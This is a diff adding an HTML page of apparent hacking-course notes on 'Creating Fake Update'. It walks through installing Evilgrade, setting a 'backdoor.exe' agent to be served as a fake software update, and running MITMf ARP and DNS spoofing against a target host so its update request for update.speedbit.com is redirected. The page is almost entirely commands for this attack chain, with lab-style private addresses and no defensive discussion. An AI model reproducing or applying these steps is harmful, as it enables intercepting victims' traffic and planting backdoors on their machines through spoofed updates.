@@ -1,0 +1,73 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Creating Fake Update</title>
+</head><body>-Fake an update for an already installed program<br/>
+-Install backdoor instead of the update<br/>
+-Requires DNS spoofing+Evilgrade(a server to serve the update)<br/>
+<br/>
+<br/>
+<b>Evilgrade installation:</b><br/>
+<br/>
+https://www.dropbox.com/s/vr1mpesah1ybuai/evilgrade.zip?dl=1<br/>
+<br/>
+Then go to the downloads and double click evilgrade.zip to uncompress it.<br/>
+<br/>
+Now open a terminal and run the following commands:<br/>
+<br/>
+cd /root/Downloads/evilgrade/<br/>
+cpan Data::Dump<br/>
+cpan Digest::MD5<br/>
+cpan Time::HiRes<br/>
+cpan RPC::XML<br/>
+cp -r isrcore /etc/perl<br/>
+<br/>
+Now the tool will work, it might display an error about Gnu.pm<br/>
+this is a known bug with evil-grade, if its annoying you<br/>
+the you can get rid of it using the by removing that lib using<br/>
+the following command<br/>
+<br/>
+apt-get remove libterm-readline-gnu-perl<br/>
+<br/>
+Just make sure you re-install it after you're done in case it is<br/>
+needed by other tools<br/>
+<br/>
+apt-get install libterm-readline-gnu-perl<br/>
+<br/>
+<b>Another installation method:<br/>
+<br/>
+</b>git clone https://github.com/infobyte/evilgrade.git<br/>
+<br/>
+cd evilgrade/<br/>
+cpan Data::Dump<br/>
+cpan Digest::MD5<br/>
+cpan Time::HiRes<br/>
+cpan RPC::XML<br/>
+<br/>
+if bug appeard write:<br/>
+<br/>
+apt-get remove libterm-readline-gnu-perl<br/>
+apt-get install libterm-readline-gnu-perl<br/>
+----------------------------------------------------------------------------<br/>
+<b>using it:</b><br/>
+<br/>
+cd evilgrade# ./evilgrade<br/>
+#configure dap<br/>
+#show options<br/>
+#set agent /var/www/html/backdoor.exe<br/>
+#show options<br/>
+#start<br/>
+---------------------------------------------------------------------------<br/>
+in another shell:<br/>
+<br/>
+#leafpad Desktop/data/MITMf/config/mitmf.conf<br/>
+--&gt;update.speedbit.com=10.0.2.4<br/>
+#python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 -i eth0 --dns<br/>
+<br/>
+--&gt;so whenever the target program is going to request update.speedbit.com, mitmf is going to redirect that to /var/www/html/backdoor.exe<br/>
+<br/>
+<br/>
+<b>Summary:<br/>
+<br/>
+</b>-The target program is going to check for updates use update.speedbit.com, the update is going to be redirected to my IP address because MITMf and MITMf is going to redirect the request where evilgrade running and evilgrade say that there is an update </body></html>
